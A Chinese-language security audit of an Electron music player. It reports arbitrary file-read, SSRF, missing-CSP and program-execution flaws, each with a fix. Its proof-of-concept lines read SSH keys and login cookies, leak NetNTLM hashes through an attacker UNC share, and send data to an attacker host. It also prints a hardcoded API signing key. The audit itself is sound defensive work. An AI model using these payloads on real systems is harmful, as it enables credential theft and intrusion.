## 0. 结论摘要

### 0.1 最严重的 5 项（按"能否直接造成本机失陷"排序）

|---|---|---|---|
| S1 | `media://` 协议无路径校验 → 任意本地文件读取 | `app/main.js:98-131` | 渲染层任意 JS 可读 `.ssh/id_rsa`、浏览器 Cookies、任意文件；UNC 路径还能触发 SMB 凭据外泄 |

### 0.3 一句话判断

**这不是"一个播放器有几个安全 bug"，而是"一个把本机文件系统与本地程序执行权都交给渲染层的桌面壳"**：`contextIsolation: true` / `nodeIntegration: false` 这两道传统防线都被自定义协议（S1、S2）和过于宽泛的 IPC（S4）从侧面绕掉了。同时，工程侧处于"能跑但不能发布"的状态——唯一存在的 exe 与源码不是同一版本，而按当前 `package.json` 重新打包会直接把在线音源模块产丢（S5）。建议在修复 S1–S5 之前**不要对外分发任何产物**。

## 1. 严重问题

### S1 【严重】`media://` 协议无任何路径校验：任意本地文件读取 + UNC 凭据外泄

**证据**

- `app/main.js:58-68` 把 `media` 注册为特权 scheme：`{ standard:true, secure:true, supportFetchAPI:true, stream:true, bypassCSP:true, corsEnabled:true }`。`supportFetchAPI + corsEnabled` 意味着**渲染层可以 `fetch()` 它并读响应体**，`bypassCSP` 意味着即便将来加了 CSP 也默认放行。
- `app/main.js:98-102` `mediaUrl(absPath)`：仅做 `\`→`/`、补前导 `/`、`encodeURI`，不校验任何东西。
- `app/main.js:103-108` `pathFromMediaUrl(u)`：
  ```js
  const url = new URL(u);
  let p = decodeURIComponent(url.pathname);
  if (/^\/[A-Za-z]:/.test(p)) p = p.slice(1);
  return p;
  ```
  只做 URL 解码与"去掉盘符前导斜杠"，**没有白名单、没有 `realpath`、没有扩展名检查、没有存在性检查**。
- `app/main.js:123-131` handler 直接 `net.fetch(pathToFileURL(p).toString())` 后把响应原样返回渲染层。
- 用 `node` 复现（`pathFromMediaUrl` 纯函数，无需 Electron）：
  ```
  media:///C:/Windows/win.ini            -> C:/Windows/win.ini
  media:///C:/Users/<u>/.ssh/id_rsa      -> C:/Users/<u>/.ssh/id_rsa
  media:////attacker/share/x.mp3         -> //attacker/share/x.mp3   （UNC）
  media:///../../etc/passwd              -> /etc/passwd
  ```

**影响（★★★）**

1. 渲染层里任意一段 JS（来源见 S3）可以：
   ```js
   const t = await (await fetch('media:///C:/Users/me/AppData/Roaming/RESONA/sources/netease.json')).text();
   ```
   直接拿到明文登录 Cookie；同理可读 SSH 私钥、`.git-credentials`、其他应用配置、任意文档。
2. `media:////attacker/share/x` 会走 Windows UNC → 触发 SMB 认证 → 局域网攻击者可拿 NetNTLM 哈希做离线爆破/中继。这是**无交互的信息泄露**，只要页面里出现一次 `new Audio(url)` / `img.src` / `fetch`。
3. 无大小上限：把 10GB 文件当响应体回传，主进程与渲染层双双分配内存。
4. 虽无 `nodeIntegration`，但这条协议等价于一个"任意文件读"的系统调用，`contextIsolation` 完全挡不住（文件读取发生在主进程）。

**最小修复**

1. 主进程维护 `allowedRoots`：内置 `assets` 解包目录 + `settings.lastFolder` + 用户通过 `app:pickFolder` 显式选择的目录（持久化到设置）。
2. handler 内**解码后 `await fsp.realpath(p)`**，再对每个 root `realpath` 后做 `path.relative(root, p)` 判定（`relative` 结果不以 `..` 开头且非绝对路径才放行），拒绝以 `\\` 开头的 UNC。
3. 只允许 `AUDIO_EXT` 内的扩展名 + 封面图片扩展名；其余一律 404。
4. `media` 的特权收紧为 `{ standard:true, secure:true, stream:true }`（`<audio>`/`<img>` 不需要 CORS/fetch）；如果必须保留 fetch，响应加 `Cross-Origin-Resource-Policy: same-origin`。

**验收**：写一个 `node` 断言脚本，对 12 条恶意 URL（含 `..` 逃逸、UNC、盘符大小写、`%2e%2e`、符号链接）断言返回 404；对合法音频断言 206/200。

### S2 【严重】`rsmedia://` 是开放正向代理：SSRF + 任意请求头 + 跨源可读

**证据**

- `app/main.js:135-172`：`rsmedia://s/?u=<urlenc>&h=<base64url JSON>`。
- `app/main.js:140` 唯一的校验是 `if (!/^https?:\/\//i.test(target))` —— **任意 http(s) 主机都放行**，包括 `http://127.0.0.1:29006`、`http://192.168.x.x`、`http://169.254.169.254`。
- `app/main.js:142-158`：`h` 参数由**调用方**提供，base64url 解码成 JSON 后**原样作为请求头**（只做 `String(v)`），只有 `Range` 是主进程覆盖的：
  ```js
  extra = JSON.parse(Buffer.from(hParam, 'base64url').toString('utf8')) || {};
  const headers = {};
  for (const [k, v] of Object.entries(extra)) { if (v == null) continue; headers[k] = String(v); }
  ```
  `Host`、`Cookie`、`Authorization`、`X-Forwarded-For` 全部可注入。
- `app/main.js:160` `net.fetch(target, { headers, bypassCustomProtocolHandlers: true })`；`:166` `out.set('access-control-allow-origin', '*')`。
- `app/main/sources/index.js:164-168` 生成该 URL 的代码是纯可逆编码：
  ```js
  const h = Buffer.from(JSON.stringify(headers || {}), 'utf8').toString('base64url');
  return 'rsmedia://s/?u=' + encodeURIComponent(url) + '&h=' + h;
  ```
  说明「鉴权头不出主进程」的设计目标**在编码层就没有实现**（见 I9）。

**复现（★，代码级已验证 URL 解析，未实际发起请求）**

```js
// 渲染层即可构造
const h = btoa(JSON.stringify({ Host: 'evil', 'X-Forwarded-For': '1.2.3.4' })).replace(/=+$/,'');
fetch(`rsmedia://s/?u=${encodeURIComponent('http://127.0.0.1:29006/api')}&h=${h}`)
```
主进程会向 `127.0.0.1:29006` 发起带自定义头的请求，并把响应（含 `ACAO:*`）回给渲染层。

**影响（★★★）**

1. **SSRF**：扫描/访问本机任意端口（开发服务器、数据库管理页、IDE 调试端口）、局域网设备管理页、云厂商元数据服务，结合 `ACAO:*` 可**读取响应内容**而不只是盲打。
2. **Host 头伪造**：可以访问只对特定 vhost 开放的内部服务。
3. **代理滥用**：把应用变成流量跳板；配合 S1 还能把本地文件内容"借道"发出去（若无 S1，直接 `u=http://attacker/` 也能外带任意请求结果）。
4. 该协议在 `registerSchemesAsPrivileged` 里也开了 `bypassCSP:true`，将来加 CSP 也挡不住。

**最小修复**

1. **取消渲染层可构造性**：`src:resolve` 不再返回可被自由编辑的 `u/h`，而是返回**主进程签发的一次性票据**：`rsmedia://s/<id>`，`id` 映射到内存里的 `{url, headers, expires}`（不可猜、不可改）。这是根治项。
2. 若保留 `u/h` 形式：对参数做 `HMAC-SHA256(secret, u + '|' + h)` 签名，handler 验签失败即 403；`secret` 每次启动随机生成。
3. 目标主机强白名单：按 `netease.js` / `qq.js` 实际返回 CDN 收集（如 `*.music.126.net`、`*.m804.music.126.net`、`*.qqmusic.qq.com`、`*.y.qq.com`），**不接受通配任意域**；拒绝私网/回环/链路本地地址（对解析后的 IP 做 `isPrivate` 判断）。
4. `h` 头白名单：只允许 `Referer`、`User-Agent`、`Range`、`Origin`；其余丢弃。
5. 去掉 `ACAO:*`（`<audio>` 播放不需要 CORS）；只允许 `GET`（当前代码未限制 method，但 `net.fetch` 未传 method，默认 GET——显式断言）。

**验收**：断言 `u=http://127.0.0.1:1/x`、`u=http://169.254.169.254/`、`u=http://10.0.0.1/`、`u=file:///C:/x`、`h` 携带 `Host` 时全部被拒。

### S3 【严重】渲染层信任边界几乎为零：无 CSP、无导航拦截、`sandbox:false`、preload 面过大

**证据**

- 主窗口：`app/main.js:307-361`。`webPreferences`（`:319-326`）为 `{ preload, contextIsolation:true, nodeIntegration:false, sandbox:false, backgroundThrottling:false, webgl:true }`。**`sandbox:false`** 意味着 preload 拥有完整 Node 能力（当前 preload 未用，但一旦被利用/扩展即直接提权）。
- 歌词窗口：`app/main.js:363-403`，同样 `sandbox:false`（`:390`）。
- **没有**任何 `will-navigate` / `will-redirect` / `web-contents-created` / `setPermissionRequestHandler` / `setPermissionCheckHandler` 拦截（`app` 源码范围内 grep 计数为 0）。唯一的导航相关代码是 `app/main.js:352-355`：
  ```js
  win.webContents.setWindowOpenHandler(({ url }) => { shell.openExternal(url); return { action: 'deny' }; });
  ```
  它**不校验 scheme**（见 S4），且不阻止当前页被导航走。
- **`index.html` 没有 CSP**（`grep -c Content-Security-Policy app/renderer/index.html` = 0）；只有 `app/renderer/lyrics.html:5` 有一条相当严格的 CSP（`default-src 'none'; img-src data:; ...`）——说明作者知道该怎么做，但主界面漏了。
- preload 暴露面：`app/preload.js:12-55`，`contextBridge.exposeInMainWorld('resona', { ... })` 共 **15 个命名空间 / 24 个可调用函数**，其中 `openPath(p)`、`scan(dirs)`、`readTags(files)`、`mediaUrl(p)`、`settings.set(patch)`、`src.call(source, method, ...args)` **全部无参数校验、直接透传**（校验缺失在主进程侧同样存在，见 S4/I9）。
- 渲染层的注入面（交叉引用，明细见渲染层审计报告）：`innerHTML` 共 142 处（`shell.js` 30、`online.js` 30、`press.js` 10、`lyrics-pro.js` 6、`history.js` 3、`press-lyrics.js` 2、`stage-viz.js` 1、`index.html` 内联脚本约 60）；其中 `online.js` 的 30 处直接渲染**第三方接口返回的歌名/歌单名/电台名/歌词**。

**攻击链（为什么这条是"严重"而不是"加固建议"）**

```
网易云/QQ 返回的歌名或歌单名里带 HTML
  → online.js 用 innerHTML 插入（142 处之一）
  → 脚本在 file:// origin 下执行（index.html 无 CSP，页面特权 scheme 全开）
  → fetch('media:///C:/Users/.../sources/netease.json')        [S1]
  → fetch('rsmedia://s/?u=https://attacker/collect&h=...')      [S2 或直接用 https]
  → resona.openPath('C:\\Users\\...\\payload.exe')              [S4]
= 本机用户权限下的任意文件读取 + 任意程序执行
```

**最小修复**

1. 全局导航/新窗口守卫（一处覆盖所有窗口）：
   ```js
   app.on('web-contents-created', (_e, wc) => {
     wc.on('will-navigate', (e) => e.preventDefault());
     wc.on('will-redirect',  (e) => e.preventDefault());
     wc.setWindowOpenHandler(() => ({ action: 'deny' }));
     wc.session.setPermissionRequestHandler((_wc, _p, cb) => cb(false));
   });
   ```
   （若需要打开外链，单独走"白名单域名 + 用户确认"的 IPC。）
2. `index.html` 加 CSP（在 `<head>` 最前面）：
   ```
   default-src 'none';
   script-src 'self';
   style-src 'self' 'unsafe-inline';
   img-src 'self' media: data: https://*.music.126.net https://*.qqmusic.qq.com;
   media-src media: rsmedia:;
   connect-src 'none';
   font-src 'self';
   ```
   `connect-src 'none'` 会立刻让 S1/S2 的 `fetch` 外带通道失效（注意：S2 若走 `<audio>` 播放仍需 `media-src`，但 `<audio>` 无法读取响应体，正好切断"读文件再外发"）。
3. `sandbox: true`：当前 preload 只用 `ipcRenderer` / `contextBridge` / `webUtils`，**在 sandbox 下完全可用**，无兼容成本。
4. 渲染层把 `innerHTML` 换成 `textContent`/`esc()`（渲染层审计报告有逐条清单）。

**验收**：`document.querySelector('meta[http-equiv="Content-Security-Policy"]')` 存在；在 DevTools 里执行 `location='https://example.com'` 被阻断；`fetch('media:///C:/Windows/win.ini')` 被 CSP 或 S1 修复阻断。

### S4 【严重】本地程序执行面：`shell:openPath` 任意路径 + `shell.openExternal` 任意 scheme

**证据**

- `app/main.js:599`：
  ```js
  ipcMain.handle('shell:openPath', (evt, p) => shell.openPath(p));
  ```
  **零校验**。`app/preload.js:19` 直接暴露为 `resona.openPath(p)`。
- `app/main.js:352-355`：`setWindowOpenHandler` 里对**任意 URL** 调用 `shell.openExternal(url)`，不区分 `http/https` 与其他 scheme：
  ```js
  win.webContents.setWindowOpenHandler(({ url }) => { shell.openExternal(url); return { action: 'deny' }; });
  ```
- 由此产生一个**功能缺陷**作为佐证：`app/renderer/shell.js:1973` 的开发者工具按钮是
  ```js
  window.open("devtools://devtools/bundled/inspector.html");
  ```
  它会被上面的 handler 交给 `shell.openExternal('devtools://...')` → Windows 找协议处理器（弹"选择应用"或什么都不发生），**按钮实际不可用**。安全的正确写法是 `win.webContents.openDevTools()`。

**影响（★★★）**

1. `resona.openPath('C:\\Users\\me\\Downloads\\setup.exe')` → 直接执行（`shell.openPath` 对可执行文件就是"运行"）。
2. `resona.openPath('\\\\attacker\\share\\x.lnk')` → 网络快捷方式执行。
3. `openExternal` 可用于触发系统协议（`ms-settings:`、`search-ms:`、`file:`），配合 S1/S3 可做钓鱼式提权链的一环。
4. `shell.openPath` 传入目录时会用资源管理器打开 —— 本身无害，但当前实现连目录/文件类型都不区分。

**最小修复**

1. `openPath` 改为"只允许在受控根目录内 + 只允许普通文件/目录 + 拒绝危险扩展名"：
   ```js
   const BAD = /\.(exe|bat|cmd|ps1|vbs|js|jse|wsf|msi|scr|com|lnk|url|reg|hta)$/i;
   ```
   `lstat` 后拒绝符号链接；`realpath` 后做 S1 同一套 root 校验。
2. 更简单：把"打开文件夹"收敛成无参数 IPC（`openMusicFolder()`，路径由主进程决定），incoming 路径一律不接受。当前只有 `shell.js:1972`（打开音乐文件夹）和设置里的"打开文件夹"在用，改成无参即可，改动很小。
3. `openExternal` 只允许 `https:` 且域名白名单（或直接删除——当前只用于 `devtools:` 这个误用）。
4. devtools 按钮改走 IPC → `win.webContents.openDevTools({ mode: 'detach' })`。

### S5 【严重】打包配置缺 `main/**`，已发布产物是旧快照且不可复现

**证据（★★★，asar 实测）**

- `app/package.json:36-42`：
  ```json
  "files": ["main.js", "preload.js", "renderer/**/*", "assets/**/*", "package.json"]
  ```
  **不含 `main/**`**，而在线音源适配层全在 `app/main/` 下（`net.js`、`sources/index.js`、`sources/netease.js`、`sources/qq.js`）。
- 当前源码 `app/main.js` 共 **805 行**；`app/main.js:486` 启动时 `require('./main/sources/index.js')`，异常被 `:492` 的 `catch` 吞成一行日志，`SOURCES` 保持 `null`。
- 后果在 IPC 层可见：`app/main.js:497-523` 的 4 个在线通道全部退化——`src:list` 返回 `[]`、`src:invoke` 返回 `{error:'sources unavailable'}`、`src:resolve` 同。**界面不报错，只是在线音乐永远空**。
- 实测已发布产物 `app/release/win-unpacked/resources/app.asar`（1303810 字节，共 284 项）：

### I2 【重要】Cookie 明文落盘 + CookieJar 无域作用域 + 重试重发 POST + 响应无上限

**证据**

- `app/main/sources/index.js:41-64`：cookie 存 `userData/sources/<id>.json`，`JSON.stringify` 明文同步写，非原子（无 tmp+rename），无加密（未使用 `safeStorage`/DPAPI，全项目 grep `safeStorage` = 0）。
- `app/main/net.js:22-79` `CookieJar` 是一个**扁平 `Map`，没有 domain/path/secure/httpOnly 维度**：
  - `:125` 每次请求都把**全部** cookie 拼进 `Cookie` 头，不管目标主机是谁；
  - `:146` `jar.absorb(res.headers['set-cookie'])` **吸收任意主机的 set-cookie**；
  - `:149-153` 重定向最多 5 次，用 `new URL(loc, target)` 直接跟，**不校验主机、不校验协议降级、不剥离 cookie**。
- `:159` `Buffer.concat(chunks)` 全量收响应，**无 `maxBytes`、无 `Content-Length` 预检**。
- `:168-173` 超时/错误时 `retry` 会用**同一个 `opts`（含 body）重发**，`retry` 在适配器里被显式使用（`qq.js:1122` `retry: 2`）。

**影响（★★）**

- 明文 `MUSIC_U` / `qqmusic_key`：同用户的任意进程都能读（Electron 的 `safeStorage` 在 Windows 上就是 DPAPI，本可只让当前用户解密），备份/同步工具也会带走。
- 一旦 CDN 或其他跳转把请求导向第三方主机，**全部网易云/QQ cookie 会外发**（无 host 作用域）。
- 重试 POST（点赞、登录、收藏）会造成重复提交/风控命中；大文件响应（整轨下载）可打爆主进程内存。
- 同步 `gunzipSync`（`net.js:86`）+ 无上限 Buffer = 主进程阻塞。

**最小修复**

1. `safeStorage.isEncryptionAvailable()` → `encryptString(JSON)` 后 base64 落盘；读回 `decryptString`；文件 ACL 收紧（或直接 `fs.chmod` 在 Windows 上无意义，故用 DPAPI）。
2. `CookieJar` 改为 `Map<host, Map<name, value>>`，`toHeader(host)` 只取匹配域（后缀匹配）的 cookie；`absorb(host, setCookie)` 按 host 存；重定向跨 host 时不带 cookie。
3. `retry` 仅对 GET/HEAD 生效（`opts.method` 判断），POST 一律不重试。
4. `request` 加 `maxBytes`（默认 64MB）+ `Content-Length` 预检 + 解压后大小再检；`decodeBody` 改异步 `zlib.gunzip`。

### I4 【重要】曲库索引不落盘，每次启动全量重扫 + 封面 base64 全量走 IPC

### I7 【重要】发布体积与资产策略：16MB 未压缩 WAV、portable 每次解压 ~200MB

**证据**

- `app/package.json:29-31` `asarUnpack: ["assets/**/*"]`；`app/assets/demo.wav` **15876044 字节**（90 秒未压缩 WAV），`app/assets/icon.png` 152718 字节。
- `app/release/RESONA-0.1.0-portable.exe` 84108477 字节；`release/win-unpacked/RESONA.exe` 188784128 字节；`app/node_modules` 564MB；`app/release` 372MB；整个工作区 1.2GB。
- `app/package.json:55-57` portable 目标 + `unpackDirName: "RESONA"` → **每次启动都把约 200MB 解压到 `%TEMP%\RESONA`**。

**影响（★★）**

- 16MB 的演示 WAV 占了 exe 近 20% 体积；而渲染层本来就有 WebAudio 合成回退（`main.js:117-120` 的 `demoAudioInfo` 注释写明"不存在时回退到运行期合成"）。
- 便携版每次启动解压 → 冷启动慢、临时目录残留（多次崩溃后堆积）、杀软全量扫描、更容易被标记可疑。
- `asarUnpack` 只为 assets，导致大量文件在工作区里重复（`release/` 内的 16MB unpacked + assets 源文件）。

**最小修复**

1. `demo.wav` 转 OGG/Opus（90 秒约 1–2MB），或干脆不打包、运行时合成。
2. 发布形态改 NSIS 安装版（一次解压 + 快捷方式 + 卸载器），portable 只作为可选；两者都签名（S5）。
3. `asarUnpack` 收窄：图标从 asar 直接读（`nativeImage.createFromPath` 支持 asar），只有真正需要外部路径的文件才 unpack。

### I8 【重要】在线适配层技术债：无重定向主机校验、无退避、硬编码签名、接口易碎

**证据**

- `app/main/net.js:149-153` 重定向不校验主机/协议（见 I2），请求可能被导向第三方。
- `app/main/sources/netease.js:36` `HOST = "https://music.163.com"`，但接口路径是未公开的明文 `/api/...`（`CONTRACT.md:86-94` 记录了依赖面）。
- `app/main/sources/qq.js:194` `sign = md5(SIGN_KEY + data)`，`SIGN_KEY` 硬编码 `"CJBPACrRuNy7"`（`:177-209`）。
- 重试/超时策略分散：`netease.js:146` `retry:1`；`qq.js:397` `retry:0`、`:1056` `retry:0`、`:1122` `retry:2`；无全局并发上限、无指数退避（只有 `sleep`）。
- 缓存过期靠猜：`app/main/sources/index.js:159` `const expires = Number(r.expires) || Date.now() + 6*3600*1000`，鉴权直链通常远短于 6 小时。

**影响（★★）**

- 平台一改接口就全坏，且没有开关/遥测，只能靠用户报"没声音"；重试 + 无退避容易被风控（封 IP/账号）；6 小时缓存会让播放中途 403，且 `resolveCache` 无容量上限（`:147-160`）。
- 这些都是"能跑但不可运营"的典型症状。

**最小修复**

1. 网络层：全局并发 2、失败指数退避（1s/2s/4s）、`Retry-After` 支持。
2. 缓存 TTL 取接口 `expires`，且上限 10 分钟；`resolveCache` 加容量上限（如 200）与 LRU。
3. 适配器接口加 `version` 字段与"能力声明"（哪些方法可用），界面按能力降级而不是报错。
4. `sign` 常量移出源码（配置文件/环境变量），避免把逆向结果硬编码进可分发二进制。

### I9 【重要】preload 能力面过大 + "鉴权头不出主进程"的注释与实现矛盾

**证据**

- `app/preload.js:12-55`：15 个命名空间 / 24 个函数；`scan(dirs)`、`readTags(files)`、`mediaUrl(p)`、`openPath(p)`、`settings.set(patch)`、`src.call(...)` 全部直接 `ipcRenderer.invoke`，**渲染层传什么主进程就用什么**（主进程侧也无校验，见 S4/I3）。
- `app/main.js:515` 注释写「返回 rsmedia:// 代理 URL（**鉴权头不出主进程**）」，但实际：
  - `app/main/sources/index.js:149,161` 返回 `rawUrl: r.url`（真实 CDN 直链）；
  - `:165-168` 把 headers 用 base64url 编进 URL（**可逆**）；
  - `app/main.js:143-158` 原样把 `h` 当请求头。
  三处叠加 = 鉴权头与直链都到了渲染层，且可被替换/重放。

**影响（★★）**

- 安全承诺落空：渲染层可直接拿到 CDN 直链并外带；`h` 可替换 → 放大 S2。
- 24 个能力意味着每新增一个功能就自动扩大攻击面；未来想收紧要改多处。

**最小修复**

1. 删 `rawUrl`；`resolve` 只回票据 URL（S2 修复项）。
2. preload 收敛为最小面：`{ pickFolder(), scanLibrary(), playUrl(ticket), settings: {get,set(白名单)}, window: {...}, lyrics: {...}, onProgress, onMediaKey }`；`openPath`、`readTags`、`mediaUrl` 三个删除（前者改无参，后两者由主进程内部使用）。
3. 所有参数在主进程侧校验（preload 不可信）。

### I10 【重要】userData 迁移与分发完整性

**证据**

- `app/main.js:452-479` `migrateUserData()`：遍历 `["RESONA","Resona","afeifei","Afeifei","Afeifei 阿飞飞"]`，只要目标侧没有 `sources/` 或 `settings.json`，就用 `fs.cpSync`/`copyFileSync` **原样复制**旧目录内容；不校验 JSON、不校验来源、不拒绝符号链接。
- 无代码签名（S5）；无 `autoUpdater`/`electron-updater`（grep = 0）→ 修复无法到达用户。
- `app/release/builder-debug.yml` 记录 `nodeModuleFilePatterns`（说明构建过程有隐式规则，不易复现）。

**影响（★★）**

- 旧目录若被历史版本或其他程序写入过（例如把 `sources/netease.json` 换成伪造文件），迁移会把伪造登录态/设置带进新版本；明文 cookie 也随之扩散到新目录。

**最小修复**

1. 迁移只复制已知文件（`settings.json`、`sources/<id>.json`），`JSON.parse` 校验成功才落地，拒绝符号链接，记录迁移日志。
2. 签名 + 更新器：`electron-updater` + 签名校验（或至少发布页提供 SHA256 与版本检查）。
3. 迁移完成后写一个 `migratedFrom` 标记，避免反复扫描旧目录。

## 3. 一般问题

### G1 主进程单文件 805 行，职责混杂
`app/main.js:1-805` 同时承担：窗口管理（307-403）、托盘（411-447）、设置（76-95）、扫描（176-304）、协议（98-172）、IPC（496-603）、冒烟测试（606-759）、生命周期（762-804）。修复：拆 `main/windows.js`、`main/library.js`、`main/protocols.js`、`main/ipc.js`、`main/settings.js`，`main.js` 只留启动编排（目标 ≤120 行）。

### G2 冒烟测试代码占生产主进程 150+ 行
`app/main.js:606-759`（`runSmoke`，含 OfflineAudioContext 基准、截图、探针、`.probe.json` 落盘）。修复：移到 `tools/smoke.js`，见 I1。

### G3 自定义协议特权给得过宽
`app/main.js:61,66`：`media`/`rsmedia` 都带 `bypassCSP:true`、`corsEnabled:true`、`supportFetchAPI:true`、`secure:true`。`secure:true` 让它们被当作安全来源，进一步削弱同源隔离；`bypassCSP` 让 CSP 形同虚设。修复：按最小需要声明（见 S1/S2）。

### G4 Track ID 用 32 位 FNV-1a，存在碰撞风险
`app/main.js:217-225`：`FNV-1a(path.toLowerCase())` 截 32 位。6000 首时碰撞概率约 0.4%（生日悖论，`1-exp(-n²/2/2^32)` ≈ 0.0042），碰撞即两首歌共享 id → 喜欢/历史/队列错乱。修复：用 64 位（BigInt/双哈希）或直接用 path 的规范化字符串作键。

### G5 扫描静默截断，无提示
`app/main.js:182,198`：深度 >6 或数量 >6000 直接 `return`，不记日志、不告知界面。修复：返回 `{truncated:true, reason}` 并在界面提示。

### G6 扫描路径存在同步 IO
`app/main.js:276` `.lrc` 用 `fs.readFileSync`；`app/main.js:81,90` 设置读写也是同步。修复：统一 `fsp`；设置层同步只保留"关闭时写一次"的极小场景，且用原子写。

### G7 渲染层 DOM 耦合与全局污染（供后续拆分参考，明细见渲染层报告）
`app/renderer/index.html` 共 2480 行：内联 CSS 7-279（272 行）、内联 `<script>` 385-2470（约 2085 行）、其后 8 个外部脚本。`shell.js` 里 `q("#<id>")` 硬编码 72 处，对应 45 个唯一 id；`window.*` 全局 15 个（`__LIB`、`__VISUAL`、`__STAGE`、`__LYRICS_PRO`、`__SHELL`、`__S`、`__ONLINE`、`__LIKES`、`__LAST_TRACK`、`__INFO`、`__HISTORY`、`__ERRORS`、`toast`、`onTrackEnd`、`__startDemoFile`）。`renderer/*.js` 合计 5413 行（shell 2319、online 1101、lyrics-pro 706、stage-viz 454、press 306、press-lyrics 249、history 203、likes 75）。修复方向：内联脚本抽文件 + 事件委托替换 id 查询 + 单一命名空间。

### G8 测试体系缺失（结构上存在，工程上无效）
